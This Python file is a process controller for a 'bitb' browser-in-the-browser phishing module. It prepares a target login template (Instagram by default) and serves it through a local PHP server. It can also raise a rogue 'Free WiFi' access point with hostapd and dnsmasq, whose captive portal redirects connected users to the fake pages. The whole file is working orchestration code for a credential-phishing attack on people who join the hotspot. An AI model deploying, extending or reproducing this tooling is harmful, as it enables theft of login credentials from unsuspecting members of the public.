import subprocess
import psutil
import os
import signal
import time

MANAGED_PROCESSES = {}


def is_process_running(name):
    for proc in psutil.process_iter(["name", "cmdline"]):
        try:
            cmdline = " ".join(proc.info["cmdline"] or [])
            if name in cmdline:
                return {"pid": proc.pid, "name": name, "status": "running"}
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return None


def get_service_status():
    services = {
        "hostapd": is_process_running("hostapd"),
        "dnsmasq": is_process_running("dnsmasq"),
        "php": is_process_running("php -S"),
        "nginx": is_process_running("nginx: master"),
    }
    return services


def _check_port(port):
    for conn in psutil.net_connections(kind="tcp"):
        if conn.laddr.port == port and conn.status == "LISTEN":
            return True
    return False


def start_module(module_name, module_dir, settings):
    if get_active_module() is not None:
        return {"success": False, "error": "Another module is already running. Please stop it first."}
        
    if module_name == "bitb":
        return _start_bitb(module_dir, settings)
    return {"success": False, "error": "Unknown module"}


def _start_bitb(module_dir, settings):
    mode = settings.get("deploy_mode", "dev")
    target = settings.get("bitb_target", "instagram")

    # Step 1: Copy target site templates using bitb.py
    try:
        subprocess.run(
            ["python3", "bitb.py", "--target", target],
            cwd=module_dir, timeout=10
        )
    except subprocess.TimeoutExpired:
        return {"success": False, "error": "bitb.py timed out preparing target template"}

    # Mode A: DEV MODE (No WiFi required, standalone PHP web server)
    if mode == "dev":
        port = settings.get("dev_port", 8080)
        # Get requested host IP or hostname if provided
        host = settings.get("host_ip") or "localhost"
        proc = subprocess.Popen(
            ["php", "-S", f"0.0.0.0:{port}", "-t", os.path.join(module_dir, "sites")],
            cwd=module_dir,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            preexec_fn=os.setsid
        )
        MANAGED_PROCESSES["bitb"] = proc
        return {"success": True, "pid": proc.pid, "mode": "dev", "url": f"http://{host}:{port}"}

    # Mode B: WIFI AP MODE (Full hotspot & captive portal redirect)
    env = os.environ.copy()
    env["WIFI_IFACE"] = settings.get("ap_interface", "wlan0")
    env["UPLINK_IFACE"] = settings.get("internet_interface", "eth0")
    env["AP_SSID"] = settings.get("ssid", "Free WiFi")
    env["AP_IP"] = settings.get("ap_ip", "10.99.0.1")
    env["DHCP_RANGE_START"] = settings.get("dhcp_range_start", "10.99.0.50")
    env["DHCP_RANGE_END"] = settings.get("dhcp_range_end", "10.99.0.150")
    env["ENABLE_NAT"] = "1" if settings.get("enable_nat", True) else "0"

    proc = subprocess.Popen(
        ["bash", "captive-portal.sh"],
        cwd=module_dir, env=env,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        preexec_fn=os.setsid
    )
    MANAGED_PROCESSES["bitb"] = proc
    return {"success": True, "pid": proc.pid, "mode": "wifi"}


def stop_module(module_name, module_dir):
    if module_name == "bitb":
        return _stop_bitb(module_dir)
    return {"success": False, "error": "Unknown module"}


def _stop_bitb(module_dir):
    proc = MANAGED_PROCESSES.pop("bitb", None)
    if proc:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
        except ProcessLookupError:
            pass

    subprocess.run(
        ["sudo", "bash", "cleanup.sh"],
        cwd=module_dir, capture_output=True
    )
    return {"success": True}


def get_module_logs(module_name, lines=100):
    if module_name == "bitb":
        proc = MANAGED_PROCESSES.get("bitb")
        if not proc or proc.poll() is not None:
            return []
        output = []
        try:
            while proc.stdout.readable():
                line = proc.stdout.readline()
                if not line:
                    break
                output.append(line.decode("utf-8", errors="replace").rstrip())
                if len(output) >= lines:
                    break
        except:
            pass
        return output
    return []


def get_active_module():
    if "bitb" in MANAGED_PROCESSES:
        proc = MANAGED_PROCESSES["bitb"]
        if proc.poll() is None:
            return "bitb"
    return None
